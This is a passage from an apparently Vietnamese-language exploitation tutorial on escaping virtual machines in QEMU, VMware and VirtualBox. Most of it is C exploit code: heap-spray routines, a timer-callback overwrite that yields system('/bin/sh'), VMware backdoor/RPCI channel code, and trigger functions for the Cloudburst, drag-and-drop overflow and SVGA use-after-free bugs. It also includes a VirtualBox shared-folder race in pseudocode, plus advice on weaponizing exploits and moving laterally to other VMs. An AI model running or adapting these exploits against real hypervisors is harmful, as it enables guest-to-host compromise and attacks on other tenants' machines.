│  │   └── Trigger allocation at precise position     │
│  ├── Overwrite strategy:                            │
│  │   ├── QEMUTimer callback (phổ biến nhất)         │
│  │   ├── MemoryRegionOps pointer                    │
│  │   ├── Function pointer trong device state        │
│  │   └── vtable pointer (C++ objects)               │
│  ├── ROP chain hoặc JOP chain                       │
│  └── Shellcode execution (nếu mprotect available)   │
│                                                      │
│  Step 6: Post-Exploitation                          │
│  ├── QEMU chạy dưới user nào? (thường qemu/libvirt)│
│  ├── Escape sandbox (seccomp, SELinux)              │
│  ├── Escalate to root (nếu cần)                    │
│  └── Lateral movement to other VMs                  │
│                                                      │
│  Step 7: Weaponize (cho lab/CTF)                    │
│  ├── Reliability: spray, retry, timing              │
│  ├── Stealth: clean up artifacts                    │
│  └── Portability: multiple QEMU versions            │
└─────────────────────────────────────────────────────┘
```

#### Heap Feng Shui trong QEMU

```c
/*
 * qemu_heap_fengshui.c — Kỹ thuật control QEMU heap layout từ guest
 *
 * QEMU dùng glib allocator (g_malloc/g_free) hoặc system malloc.
 * Guest có thể trigger allocations/frees trong QEMU bằng:
 *
 * 1. Network packets → SLiRP buffers (mbuf)
 * 2. USB transfers → USB buffers
 * 3. virtio descriptors → scatter-gather lists
 * 4. PCI config → device state allocations
 * 5. Timer creation → QEMUTimer objects
 */

/* Phương pháp 1: Spray qua network packets */
void heap_spray_via_network(int count, size_t size) {
    /*
     * Gửi UDP packets qua SLiRP
     * Mỗi packet → mbuf allocation trong QEMU
     * 
     * mbuf size = sizeof(struct mbuf) + packet_size
     * 
     * Spray nhiều packets → fill heap holes
     * Sau đó free một số → tạo hole ở vị trí desired
     * Trigger vulnerability → object allocated at hole
     */
    
    int socks[1024];
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(12345);
    inet_aton("10.0.2.2", &addr.sin_addr);
    
    char *buf = calloc(1, size);
    
    for (int i = 0; i < count; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        sendto(socks[i], buf, size, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    /* Free specific sockets to create holes */
    /* close(socks[target_index]); */
    
    free(buf);
}

/* Phương pháp 2: Spray qua virtio descriptor chains */
void heap_spray_via_virtio(volatile void *mmio) {
    /*
     * Submit nhiều indirect descriptor tables
     * Mỗi indirect table → g_malloc() trong QEMU
     * Control allocation size bằng indirect table size
     */
}

/* Phương pháp 3: QEMUTimer target object */
/*
 * QEMUTimer là target phổ biến nhất:
 * 
 * struct QEMUTimer {
 *     int64_t expire_time;
 *     QEMUTimerList *timer_list;
 *     QEMUTimerCB *cb;          ← FUNCTION POINTER (target!)
 *     void *opaque;              ← ARGUMENT cho callback
 *     QEMUTimer *next;
 *     int attributes;
 *     int scale;
 * };
 *
 * Overwrite cb → ghi address của system()
 * Overwrite opaque → ghi address của "/bin/sh" string
 * Khi timer fires → system("/bin/sh") trong QEMU process!
 *
 * Hoặc: cb = &mprotect, opaque = args → make heap executable
 *        Sau đó jump to shellcode trên heap
 */
```

---

## Phần 4: VMware Escape

### 4.1 VMware Architecture — Backdoor/RPCI

```c
/*
 * VMware có "Backdoor" interface: communication channel giữa guest ↔ host
 * Dùng special I/O port 0x5658 (vmware magic port)
 *
 * Guest thực hiện IN/OUT với magic value → VMware intercepts
 * Không cần VM Exit truyền thống, VMware handle trực tiếp
 */

/* VMware Backdoor Protocol */
#define VMWARE_MAGIC         0x564D5868  /* "VMXh" */
#define VMWARE_PORT          0x5658      /* Low-bandwidth port */
#define VMWARE_PORTHB        0x5659      /* High-bandwidth port */

/* Backdoor commands */
#define VMWARE_CMD_GETVERSION       0x0A
#define VMWARE_CMD_MESSAGE          0x1E  /* RPCI message */
#define VMWARE_CMD_ABSPOINTER_DATA  0x27
#define VMWARE_CMD_ABSPOINTER_STATUS 0x28
#define VMWARE_CMD_ABSPOINTER_COMMAND 0x29

/* Channel subtypes for CMD_MESSAGE */
#define RPCI_OPEN    0x00000000
#define RPCI_SENDLEN 0x00010000
#define RPCI_SENDDAT 0x00020000
#define RPCI_RECVLEN 0x00030000
#define RPCI_RECVDAT 0x00040000
#define RPCI_CLOSE   0x00060000

typedef struct {
    union {
        uint32_t ax;
        uint32_t magic;
    };
    union {
        uint32_t bx;
        uint32_t size;
    };
    union {
        uint32_t cx;
        uint32_t command;
    };
    union {
        uint32_t dx;
        uint32_t port;
    };
    uint32_t si;
    uint32_t di;
    uint32_t bp;
} vmware_backdoor_t;

static inline void vmware_backdoor(vmware_backdoor_t *cmd) {
    __asm__ volatile(
        "push %%ebp\n\t"
        "mov %7, %%ebp\n\t"
        "inl %%dx, %%eax\n\t"
        "pop %%ebp"
        : "=a"(cmd->ax), "=b"(cmd->bx), "=c"(cmd->cx),
          "=d"(cmd->dx), "=S"(cmd->si), "=D"(cmd->di)
        : "a"(VMWARE_MAGIC), "m"(cmd->bp),
          "b"(cmd->bx), "c"(cmd->command),
          "d"(cmd->port), "S"(cmd->si), "D"(cmd->di)
        : "memory"
    );
}

/* High-bandwidth backdoor (for data transfer) */
static inline void vmware_backdoor_hb(vmware_backdoor_t *cmd, 
                                       int direction /* 0=out, 1=in */) {
    if (direction == 0) {
        /* REP OUTSB */
        __asm__ volatile(
            "push %%ebp\n\t"
            "mov %7, %%ebp\n\t"
            "cld\n\t"
            "rep outsb\n\t"
            "pop %%ebp"
            : "=a"(cmd->ax), "=b"(cmd->bx), "=c"(cmd->cx),
              "=d"(cmd->dx), "=S"(cmd->si), "=D"(cmd->di)
            : "a"(VMWARE_MAGIC), "m"(cmd->bp),
              "b"(cmd->bx), "c"(cmd->command),
              "d"(cmd->port), "S"(cmd->si), "D"(cmd->di)
            : "memory"
        );
    } else {
        /* REP INSB */
        __asm__ volatile(
            "push %%ebp\n\t"
            "mov %7, %%ebp\n\t"
            "cld\n\t"
            "rep insb\n\t"
            "pop %%ebp"
            : "=a"(cmd->ax), "=b"(cmd->bx), "=c"(cmd->cx),
              "=d"(cmd->dx), "=S"(cmd->si), "=D"(cmd->di)
            : "a"(VMWARE_MAGIC), "m"(cmd->bp),
              "b"(cmd->bx), "c"(cmd->command),
              "d"(cmd->port), "S"(cmd->si), "D"(cmd->di)
            : "memory"
        );
    }
}
```

### 4.2 CVE-2009-1244 — Cloudburst (VMware Workstation/Player)

```c
/*
 * cloudburst.c — VMware Workstation Display Function vulnerability
 * 
 * Discovered by: Immunity Inc. (Kostya Kortchinsky)
 * Presented at: Black Hat USA 2009
 *
 * Bug: VMware display (video) driver xử lý SVGA commands sai
 * Khi guest gửi SVGA command với specific parameters,
 * VMware process xử lý command với pointer arithmetic sai
 * → arbitrary read/write trong VMware process memory
 *
 * Attack surface: SVGA device emulation
 * Guest ghi vào SVGA command FIFO (MMIO)
 * VMware host process đọc và execute commands
 */

/*
 * VMware SVGA protocol:
 * 
 * SVGA registers (I/O ports):
 *   INDEX port (0x15C0): register index
 *   VALUE port (0x15C1): register value
 *
 * SVGA FIFO (shared memory):
 *   Guest ghi commands vào FIFO
 *   Host (VMware) đọc và process
 *   FIFO layout:
 *     [0]: FIFO_MIN — start of command area
 *     [1]: FIFO_MAX — end of command area  
 *     [2]: FIFO_NEXT_CMD — next write position (guest updates)
 *     [3]: FIFO_STOP — next read position (host updates)
 *     [4+]: Command data
 */

/* SVGA registers */
#define SVGA_REG_ID           0
#define SVGA_REG_ENABLE       1
#define SVGA_REG_WIDTH        2
#define SVGA_REG_HEIGHT       3
#define SVGA_REG_MAX_WIDTH    4
#define SVGA_REG_MAX_HEIGHT   5
#define SVGA_REG_BPP          7
#define SVGA_REG_FB_START     13
#define SVGA_REG_FB_OFFSET    14
#define SVGA_REG_FB_SIZE      16
#define SVGA_REG_CAPABILITIES 17
#define SVGA_REG_MEM_START    18
#define SVGA_REG_MEM_SIZE     19
#define SVGA_REG_CONFIG_DONE  20
#define SVGA_REG_SYNC         21

/* SVGA FIFO registers */
#define SVGA_FIFO_MIN         0
#define SVGA_FIFO_MAX         1
#define SVGA_FIFO_NEXT_CMD    2
#define SVGA_FIFO_STOP        3

/* SVGA commands (trong FIFO) */
#define SVGA_CMD_UPDATE           1
#define SVGA_CMD_RECT_FILL        2
#define SVGA_CMD_RECT_COPY        3
#define SVGA_CMD_DEFINE_BITMAP    4
#define SVGA_CMD_DEFINE_CURSOR    19
#define SVGA_CMD_DEFINE_ALPHA_CURSOR 22
#define SVGA_CMD_FENCE            30
#define SVGA_CMD_ESCAPE           33  /* Extensible command */

#define SVGA_IO_BASE  0x15C0
#define SVGA_IO_MUL   1

static inline void svga_write_reg(uint32_t index, uint32_t value) {
    outl(index, SVGA_IO_BASE + 0 * SVGA_IO_MUL);
    outl(value, SVGA_IO_BASE + 1 * SVGA_IO_MUL);
}

static inline uint32_t svga_read_reg(uint32_t index) {
    outl(index, SVGA_IO_BASE + 0 * SVGA_IO_MUL);
    return inl(SVGA_IO_BASE + 1 * SVGA_IO_MUL);
}

/*
 * Cloudburst exploit outline:
 *
 * 1. Map SVGA FIFO memory (MMIO)
 * 2. Initialize SVGA device
 * 3. Send crafted SVGA_CMD_DEFINE_BITMAP/CURSOR command
 *    với dimensions/parameters gây pointer miscalculation
 * 4. VMware copies pixel data using wrong size calculation
 * 5. Overflow → overwrite VMware internal structures
 * 6. Gain code execution in vmware-vmx process
 */

void svga_init(volatile uint32_t *fifo) {
    svga_write_reg(SVGA_REG_ID, 0x900000002);  /* SVGA II */
    svga_write_reg(SVGA_REG_ENABLE, 1);
    
    /* Set up FIFO */
    fifo[SVGA_FIFO_MIN] = 4 * sizeof(uint32_t);
    fifo[SVGA_FIFO_MAX] = 256 * 1024;  /* 256KB FIFO */
    fifo[SVGA_FIFO_NEXT_CMD] = 4 * sizeof(uint32_t);
    fifo[SVGA_FIFO_STOP] = 4 * sizeof(uint32_t);
    
    svga_write_reg(SVGA_REG_CONFIG_DONE, 1);
}

void svga_write_fifo(volatile uint32_t *fifo, uint32_t value) {
    uint32_t next = fifo[SVGA_FIFO_NEXT_CMD];
    uint32_t max = fifo[SVGA_FIFO_MAX];
    uint32_t min = fifo[SVGA_FIFO_MIN];
    
    fifo[next / 4] = value;
    next += 4;
    if (next >= max) next = min;
    fifo[SVGA_FIFO_NEXT_CMD] = next;
}

/*
 * Crafted cursor command:
 * Width * Height * BPP → integer overflow → small allocation
 * But actual data copy uses original (large) values
 * → heap overflow in VMware process
 */
void trigger_cloudburst(volatile uint32_t *fifo) {
    svga_write_fifo(fifo, SVGA_CMD_DEFINE_ALPHA_CURSOR);
    svga_write_fifo(fifo, 0);        /* Cursor ID */
    svga_write_fifo(fifo, 0);        /* Hotspot X */
    svga_write_fifo(fifo, 0);        /* Hotspot Y */
    svga_write_fifo(fifo, 0x10000);  /* Width — large value! */
    svga_write_fifo(fifo, 0x10000);  /* Height — large value! */
    /* Width * Height * 4 = integer overflow → small buffer allocated
     * But loop copies Width * Height * 4 bytes → OVERFLOW */
    
    /* Fill with controlled data (overwrite target) */
    for (int i = 0; i < 4096; i++) {
        svga_write_fifo(fifo, 0x41414141);
    }
    
    /* Sync to trigger processing */
    svga_write_reg(SVGA_REG_SYNC, 1);
}
```

### 4.3 CVE-2017-4901 — VMware Drag-and-Drop Heap Overflow

```c
/*
 * vmware_dnd_exploit.c — Heap overflow qua VMware DnD protocol
 *
 * VMware Tools cho phép Drag-and-Drop giữa host ↔ guest.
 * DnD protocol dùng RPCI messages.
 *
 * Bug: DnD Version 3 handler xử lý kích thước payload sai
 * → heap overflow trong vmware-vmx process
 *
 * Discovered by: Zhaofeng Chen, Qihoo 360
 * Được sử dụng tại Pwn2Own 2017
 */

/* 
 * RPCI Message format cho DnD:
 * 
 * tools.capability.dnd_version 3
 * dnd.setGuestFileRoot <path>
 * dnd.transport <size> <data>
 *
 * Bug nằm ở xử lý "dnd.transport" message:
 * - size parameter từ guest (untrusted)
 * - Host allocate buffer based on size
 * - Nhưng copy loop dùng different size → overflow
 */

/* Gửi RPCI message từ guest */
int vmware_rpci_send(const char *msg, size_t len, 
                      char *reply, size_t *reply_len) {
    vmware_backdoor_t cmd;
    uint16_t channel_id;
    
    /* Open RPCI channel */
    memset(&cmd, 0, sizeof(cmd));
    cmd.cx = VMWARE_CMD_MESSAGE | RPCI_OPEN;
    cmd.bx = 0x49435052;  /* "RPCI" */
    cmd.port = VMWARE_PORT;
    vmware_backdoor(&cmd);
    
    if ((cmd.cx & 0x10000) == 0) {
        return -1;  /* Failed to open channel */
    }
    channel_id = (cmd.dx >> 16) & 0xFFFF;
    
    /* Send message length */
    memset(&cmd, 0, sizeof(cmd));
    cmd.cx = VMWARE_CMD_MESSAGE | RPCI_SENDLEN;
    cmd.bx = len;
    cmd.dx = (channel_id << 16) | VMWARE_PORT;
    cmd.si = 0;
    vmware_backdoor(&cmd);
    
    /* Send message data (high-bandwidth) */
    memset(&cmd, 0, sizeof(cmd));
    cmd.cx = len;
    cmd.bx = 0x00010000 | 0x00040000;  /* HB + data */
    cmd.dx = (channel_id << 16) | VMWARE_PORTHB;
    cmd.si = (uint32_t)(uintptr_t)msg;
    cmd.bp = (uint32_t)((uintptr_t)msg >> 32);
    vmware_backdoor_hb(&cmd, 0);  /* direction = out */
    
    /* Receive reply length */
    memset(&cmd, 0, sizeof(cmd));
    cmd.cx = VMWARE_CMD_MESSAGE | RPCI_RECVLEN;
    cmd.dx = (channel_id << 16) | VMWARE_PORT;
    vmware_backdoor(&cmd);
    
    uint32_t rlen = cmd.bx;
    if (reply && reply_len && rlen > 0) {
        if (rlen > *reply_len) rlen = *reply_len;
        
        /* Receive reply data */
        memset(&cmd, 0, sizeof(cmd));
        cmd.cx = rlen;
        cmd.bx = 0x00010000 | 0x00040000;
        cmd.dx = (channel_id << 16) | VMWARE_PORTHB;
        cmd.di = (uint32_t)(uintptr_t)reply;
        cmd.bp = (uint32_t)((uintptr_t)reply >> 32);
        vmware_backdoor_hb(&cmd, 1);  /* direction = in */
        
        *reply_len = rlen;
    }
    
    /* Close channel */
    memset(&cmd, 0, sizeof(cmd));
    cmd.cx = VMWARE_CMD_MESSAGE | RPCI_CLOSE;
    cmd.dx = (channel_id << 16) | VMWARE_PORT;
    vmware_backdoor(&cmd);
    
    return 0;
}

/*
 * Trigger DnD vulnerability:
 */
void trigger_dnd_overflow(void) {
    char reply[1024];
    size_t rlen;
    
    /* Step 1: Set DnD version to 3 */
    const char *set_ver = "tools.capability.dnd_version 3";
    rlen = sizeof(reply);
    vmware_rpci_send(set_ver, strlen(set_ver), reply, &rlen);
    
    /* Step 2: Set guest file root */
    const char *set_root = "dnd.setGuestFileRoot /tmp";
    rlen = sizeof(reply);
    vmware_rpci_send(set_root, strlen(set_root), reply, &rlen);
    
    /* Step 3: Send oversized transport data */
    size_t payload_size = 0x10000;  /* 64KB — larger than expected */
    char *payload = malloc(32 + payload_size);
    
    /* "dnd.transport <size_hex> <data>" */
    int header_len = snprintf(payload, 32, "dnd.transport %zx ", payload_size);
    
    /* Fill data portion with controlled content */
    memset(payload + header_len, 'A', payload_size);
    
    /*
     * Bug: host parses size, allocates buffer,
     * nhưng subsequent copy uses unchecked length
     * → heap overflow trong vmware-vmx process
     */
    
    rlen = sizeof(reply);
    vmware_rpci_send(payload, header_len + payload_size, reply, &rlen);
    
    free(payload);
}
```

### 4.4 CVE-2017-4902/4903/4904/4905 — Pwn2Own 2017 VMware Chain

```
Pwn2Own 2017: Đầu tiên escape từ VM ra host qua VMware Workstation

Team: Qihoo 360 Security
Chain: Guest JavaScript → Edge RCE → Windows kernel EoP → VMware Escape

VMware bugs used:
├── CVE-2017-4902: xHCI (USB 3.0) uninitialized stack variable
├── CVE-2017-4903: SVGA shader translator type confusion  
├── CVE-2017-4904: xHCI uninitialized use → code execution
└── CVE-2017-4905: xHCI info leak (bypass ASLR)

Exploit chain:
1. Edge RCE: JavaScript engine bug → arbitrary code in renderer
2. Sandbox escape: Windows kernel bug → SYSTEM privileges
3. VMware info leak (CVE-2017-4905): leak vmware-vmx address
4. VMware escape (CVE-2017-4904): heap overflow → control vmware-vmx
5. Code execution on host: reverse shell / calc.exe
```

### 4.5 CVE-2020-3962 — VMware SVGA Use-After-Free

```c
/*
 * VMware SVGA 3D acceleration Use-After-Free
 *
 * VMware SVGA device hỗ trợ 3D acceleration (shader processing).
 * Shader objects được allocate/free dynamically.
 * Race condition giữa shader destroy và shader use → UAF
 *
 * File: trong vmware-vmx binary (closed source)
 *
 * Attack strategy:
 * 1. Create shader object → allocation
 * 2. Trigger shader destruction
 * 3. Reclaim freed memory (heap spray)
 * 4. Use stale shader reference → dereference controlled data
 */

/*
 * SVGA 3D command interface:
 * 
 * Guest ghi commands vào SVGA FIFO hoặc command buffer
 * Commands cho 3D:
 */

/* SVGA 3D commands */
#define SVGA_3D_CMD_SURFACE_DEFINE     1040
#define SVGA_3D_CMD_SURFACE_DESTROY    1041
#define SVGA_3D_CMD_SURFACE_COPY       1042
#define SVGA_3D_CMD_SURFACE_STRETCHBLT 1043
#define SVGA_3D_CMD_SURFACE_DMA        1044
#define SVGA_3D_CMD_CONTEXT_DEFINE     1045
#define SVGA_3D_CMD_CONTEXT_DESTROY    1046
#define SVGA_3D_CMD_SHADER_DEFINE      1049
#define SVGA_3D_CMD_SHADER_DESTROY     1050
#define SVGA_3D_CMD_SET_SHADER         1048
#define SVGA_3D_CMD_DRAW_PRIMITIVES    1058

typedef struct {
    uint32_t id;          /* Command type */
    uint32_t size;        /* Command data size */
} SVGA3dCmdHeader;

typedef struct {
    uint32_t cid;         /* Context ID */
    uint32_t shid;        /* Shader ID */
    uint32_t type;        /* Vertex/Pixel shader */
    /* Followed by shader bytecode */
} SVGA3dCmdDefineShader;

typedef struct {
    uint32_t cid;
    uint32_t shid;
    uint32_t type;
} SVGA3dCmdDestroyShader;

/*
 * UAF scenario:
 * 
 * Thread 1 (FIFO processing):
 *   process_cmd(SHADER_DEFINE, shid=1)    → allocate shader
 *   process_cmd(SET_SHADER, shid=1)       → shader referenced
 *   process_cmd(DRAW_PRIMITIVES)          → uses shader 1
 *
 * Thread 2 (concurrent command buffer):
 *   process_cmd(SHADER_DESTROY, shid=1)   → free shader!
 *
 * If DRAW_PRIMITIVES runs after SHADER_DESTROY:
 *   → dereferences freed shader pointer → UAF!
 *
 * Exploitation:
 *   1. Spray heap to reclaim freed shader memory
 *   2. Place controlled data (fake shader with function pointers)
 *   3. When VMware processes the shader → calls our function pointer
 */

void trigger_svga_uaf(volatile uint32_t *fifo) {
    /* Create shader */
    uint8_t shader_bytecode[] = {
        /* Minimal vertex shader bytecode */
        0x00, 0x02, 0xFE, 0xFF,  /* vs_2_0 */
        0x00, 0x00, 0x00, 0x00,  /* NOP */
        0xFF, 0xFF, 0x00, 0x00,  /* END */
    };
    
    SVGA3dCmdHeader hdr;
    SVGA3dCmdDefineShader def;
    
    /* Define shader */
    hdr.id = SVGA_3D_CMD_SHADER_DEFINE;
    hdr.size = sizeof(def) + sizeof(shader_bytecode);
    
    def.cid = 0;
    def.shid = 1;
    def.type = 0;  /* vertex shader */
    
    svga_write_fifo(fifo, hdr.id);
    svga_write_fifo(fifo, hdr.size);
    svga_write_fifo(fifo, def.cid);
    svga_write_fifo(fifo, def.shid);
    svga_write_fifo(fifo, def.type);
    
    /* Write shader bytecode */
    for (size_t i = 0; i < sizeof(shader_bytecode); i += 4) {
        uint32_t val = *(uint32_t *)(shader_bytecode + i);
        svga_write_fifo(fifo, val);
    }
    
    /* Rapidly destroy and recreate to trigger race */
    for (int i = 0; i < 1000; i++) {
        /* Destroy shader */
        svga_write_fifo(fifo, SVGA_3D_CMD_SHADER_DESTROY);
        svga_write_fifo(fifo, sizeof(SVGA3dCmdDestroyShader));
        svga_write_fifo(fifo, 0);   /* cid */
        svga_write_fifo(fifo, 1);   /* shid */
        svga_write_fifo(fifo, 0);   /* type */
        
        /* Immediately try to use it */
        svga_write_fifo(fifo, SVGA_3D_CMD_SET_SHADER);
        svga_write_fifo(fifo, 12);  /* size */
        svga_write_fifo(fifo, 0);   /* cid */
        svga_write_fifo(fifo, 0);   /* type */
        svga_write_fifo(fifo, 1);   /* shid — possibly freed! */
        
        /* Draw using stale shader reference */
        svga_write_fifo(fifo, SVGA_3D_CMD_DRAW_PRIMITIVES);
        svga_write_fifo(fifo, 24);
        /* SVGA3dCmdDrawPrimitives data... */
        svga_write_fifo(fifo, 0);   /* cid */
        svga_write_fifo(fifo, 1);   /* numVertexDecls */
        svga_write_fifo(fifo, 1);   /* numRanges */
        svga_write_fifo(fifo, 0);   /* padding */
        svga_write_fifo(fifo, 0);   /* vertex decl data */
        svga_write_fifo(fifo, 0);   /* range data */
    }
    
    svga_write_reg(SVGA_REG_SYNC, 1);
}
```

### 4.6 CVE-2023-20869/20870 — Bluetooth & Host-Side Vulnerabilities

```c
/*
 * CVE-2023-20869 — VMware Workstation Bluetooth Stack Overflow
 * CVSS: 9.3 (Critical)
 *
 * Bug: Stack-based buffer overflow trong Bluetooth device sharing.
 * Khi VM share Bluetooth adapter từ host, VMware process
 * xử lý Bluetooth HCI commands từ guest.
 * Crafted HCI command với oversized parameter → stack overflow.
 *
 * CVE-2023-20870 — VMware Workstation Information Disclosure
 * Bug: OOB read trong Bluetooth HGFS → leak host memory
 *
 * Exploit approach:
 * 1. Enable Bluetooth passthrough trong VM config
 * 2. Từ guest, gửi crafted HCI commands qua USB passthrough
 * 3. Stack overflow → overwrite return address
 * 4. ROP chain → code execution trên host
 *
 * Đặc biệt: Stack overflow dễ exploit hơn heap overflow
 * vì control được return address trực tiếp
 */

/* HCI Command structure (Bluetooth spec) */
typedef struct {
    uint16_t opcode;       /* OGF (6 bits) + OCF (10 bits) */
    uint8_t  param_len;    /* Parameter total length */
    uint8_t  params[];     /* Variable length parameters */
} __attribute__((packed)) hci_command_t;

/*
 * Vulnerable pattern:
 * void handle_hci_cmd(hci_command_t *cmd) {
 *     char local_buf[256];
 *     // BUG: cmd->param_len có thể > 256
 *     memcpy(local_buf, cmd->params, cmd->param_len);  // STACK OVERFLOW!
 * }
 */
```

### 4.7 VMware RPCI Protocol — Full Analysis

```c
/*
 * vmware_rpci_full.c — Complete RPCI protocol implementation
 * 
 * RPCI (Remote Procedure Call Interface) là kênh chính
 * giữa guest ↔ host trong VMware.
 *
 * Sử dụng cho: DnD, Copy/Paste, Shared Folders, Tools info, etc.
 *
 * Mọi RPCI command là text-based:
 *   "info-get guestinfo.xxx" → get guest info
 *   "info-set guestinfo.xxx value" → set guest info
 *   "tools.capability.xxx" → set capabilities
 *   "dnd.xxx" → drag and drop operations
 *   "unity.xxx" → Unity mode operations
 *   "vmx.capability.xxx" → query VMX capabilities
 */

/* Enumerate all RPCI commands (useful for attack surface mapping) */
static const char *rpci_commands[] = {
    /* Info commands */
    "info-get guestinfo.ip",
    "info-get guestinfo.dns",
    "info-get machine.id",
    "info-set guestinfo.ip",
    
    /* Tools commands */
    "tools.capability.hgfs_server toolbox 1",
    "tools.capability.dnd_version 3",
    "tools.capability.copypaste_version 3",
    "tools.capability.unity 1",
    
    /* DnD commands (attack surface!) */
    "dnd.setGuestFileRoot",
    "dnd.transport",
    "dnd.updateFeedback",
    "dnd.ungrab",
    
    /* Copy/Paste (attack surface!) */
    "copypaste.setGuestClipboardText",
    
    /* Unity mode (attack surface!) */
    "unity.window.show",
    "unity.window.move",
    "unity.window.close",
    
    /* Shared Folders / HGFS */
    "f ",  /* HGFS protocol prefix */
    
    NULL
};

/*
 * Fuzzing approach:
 * - Enumerate all RPCI commands
 * - Fuzz parameters (length, content, format)
 * - Monitor vmware-vmx process for crashes
 * - Attach debugger (WinDbg/GDB) to vmware-vmx
 */
```

---

## Phần 5: VirtualBox Escape

### 5.1 VirtualBox Architecture

```
┌─────────────────────────────────────────────────────┐
│                    Guest VM                         │
│  ┌─────────────────────────────────────────────┐    │
│  │ Guest Additions (optional but common)       │    │
│  │  ├── VBoxGuest.sys/vboxguest.ko (driver)    │    │
│  │  ├── VBoxService (daemon)                   │    │
│  │  └── VBoxClient (per-user)                  │    │
│  └─────────────────────────────────────────────┘    │
│         │                                           │
│  I/O: Port I/O, MMIO, PCI                          │
│  VMMDev: Special PCI device for host communication  │
│  HGCM: Host-Guest Communication Manager             │
└─────────┼───────────────────────────────────────────┘
          │
┌─────────┼───────────────────────────────────────────┐
│  VirtualBox Components (Host)                       │
│         ▼                                           │
│  ┌──────────┐  ┌───────────┐  ┌────────────────┐   │
│  │ VBoxSVC  │  │VBoxManage │  │ VirtualBoxVM   │   │
│  │ (service)│  │ (CLI)     │  │ (VM process)   │   │
│  └──────────┘  └───────────┘  │                │   │
│                               │ ┌────────────┐ │   │
│                               │ │ Device Emu │ │   │
│                               │ │  ├── E1000 │ │   │
│                               │ │  ├── ICH9  │ │   │
│                               │ │  ├── OHCI  │ │   │
│                               │ │  ├── xHCI  │ │   │
│                               │ │  ├── VMSVGA│ │   │
│                               │ │  └── ...   │ │   │
│                               │ └────────────┘ │   │
│                               │ ┌────────────┐ │   │
│                               │ │HGCM Server │ │   │
│                               │ │ ├─SharedFld│ │   │
│                               │ │ ├─GstCtrl  │ │   │
│                               │ │ ├─DnD      │ │   │
│                               │ │ └─Clipbrd  │ │   │
│                               │ └────────────┘ │   │
│                               └────────────────┘   │
│  ┌──────────────────────────────────────────────┐   │
│  │ VBoxDrv.sys/vboxdrv.ko (kernel driver)      │   │
│  │ → Ring-0 hypervisor component               │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘

Attack Surface Summary:
1. Device emulation (E1000, xHCI, VMSVGA, etc.) — same as QEMU
2. HGCM services (Shared Folders, DnD, Clipboard) — rich protocol
3. VMMDev PCI device — host-guest communication
4. 3D Acceleration (Chromium/VMSVGA) — HUGE codebase, many bugs
5. VBoxDrv kernel module — kernel-level attack surface
```

### 5.2 CVE-2018-2698 — Shared Folders Privilege Escalation

```c
/*
 * VirtualBox Shared Folders (vboxsf) vulnerability
 *
 * Shared Folders dùng HGCM protocol:
 * Guest driver (vboxsf) → VMMDev → HGCM → Host service (SharedFolders)
 *
 * Bug: HGCM message handling race condition
 * Guest gửi HGCM request, host processes nó.
 * Nếu guest modify request buffer trong khi host đang process
 * → TOCTOU (Time-of-Check-Time-of-Use) → host reads modified data
 *
 * Impact: Guest → Host code execution
 */

/*
 * HGCM (Host-Guest Communication Manager) protocol:
 *
 * Guest allocates request buffer trong shared memory
 * Guest notifies host via VMMDev PCI device
 * Host reads request, processes, writes response
 * Host notifies guest via interrupt
 *
 * TOCTOU attack:
 * Guest Thread 1: submit HGCM request
 * Guest Thread 2: modify request buffer while host processes
 * 
 * Nếu host reads "size" field, validates it,
 * then guest changes "size" to larger value,
 * host reads data based on new (larger) size → OOB!
 */

/* VMMDev HGCM structures */
typedef struct {
    uint32_t result;           /* Host fills this */
    uint32_t u32ClientID;
    uint32_t u32Function;      /* HGCM function number */
    uint32_t cParms;           /* Number of parameters */
    /* Followed by HGCMFunctionParameter array */
} VMMDevHGCMCall;

typedef struct {
    uint32_t type;             /* Parameter type */
    union {
        uint32_t value32;
        uint64_t value64;
        struct {
            uint32_t size;     /* Buffer size — TARGET for TOCTOU! */
            uint32_t u32;      /* Union type indicator */
            /* Buffer data follows or is pointed to */
        } Pointer;
    } u;
} HGCMFunctionParameter;

/* SharedFolders HGCM functions */
#define SHFL_FN_QUERY_MAPPINGS     1
#define SHFL_FN_QUERY_MAP_NAME     2
#define SHFL_FN_CREATE             3
#define SHFL_FN_CLOSE              4
#define SHFL_FN_READ               5
#define SHFL_FN_WRITE              6
#define SHFL_FN_LIST               8
#define SHFL_FN_INFORMATION        9
#define SHFL_FN_SYMLINK            16

/*
 * TOCTOU exploit pseudocode:
 *
 * // Allocate HGCM request in shared memory
 * req = mmap(VMMDev_shared_region);
 * 
 * // Thread 1: Submit legitimate request
 * req->u32Function = SHFL_FN_READ;
 * req->parms[0].u.Pointer.size = 0x100;  // Small, valid size
 * ioctl(vboxguest_fd, VBOXGUEST_IOCTL_HGCM_CALL, req);
 * 
 * // Thread 2: Race to modify size after validation
 * while (1) {
 *     req->parms[0].u.Pointer.size = 0x100;   // Valid for check
 *     usleep(1);
 *     req->parms[0].u.Pointer.size = 0x10000;  // Large for use → OOB!
 * }
 */
```

### 5.3 CVE-2019-2525 + CVE-2019-2548 — VirtualBox 3D Acceleration Chain

```c
/*
 * VirtualBox 3D acceleration dùng Chromium library (trước v6.1)
 * và VMSVGA (v6.1+). Chromium codebase rất lớn → nhiều bugs.
 *
 * CVE-2019-2525: Info leak qua Chromium protocol
 * CVE-2019-2548: Integer overflow → heap overflow
 *
 * Exploit chain: info leak → bypass ASLR → overflow → code execution
 */

/*
 * Chromium (OpenGL passthrough) protocol:
 * 
 * Guest sends OpenGL commands → HGCM → Host Chromium service
 * Chromium service renders and returns results
 *
 * Commands are serialized as "opcodes" with parameters
 * Large attack surface: hundreds of opcodes, complex parameter handling
 */

/* Chromium opcodes (relevant ones) */
#define CR_EXTEND_OPCODE           0xE   /* Extended commands */
#define CR_READPIXELS_OPCODE       0x100 /* glReadPixels (extended) */
#define CR_GETSTRING_OPCODE        0x101 /* glGetString (extended) */

/* Example info leak via glGetString */
/*
 * Guest sends CR_GETSTRING_OPCODE with specific name parameter
 * Host returns string data that includes uninitialized heap bytes
 * → Leak host heap addresses → defeat ASLR
 *
 * After ASLR defeat, exploit integer overflow in texture handling:
 * width * height * bpp = integer overflow → small allocation
 * Copy uses original (large) dimensions → heap overflow
 */

/* VirtualBox Chromium HGCM interface */
#define SHCRGL_GUEST_FN_WRITE       1
#define SHCRGL_GUEST_FN_READ        2
#define SHCRGL_GUEST_FN_WRITE_READ  3
#define SHCRGL_GUEST_FN_INJECT      5

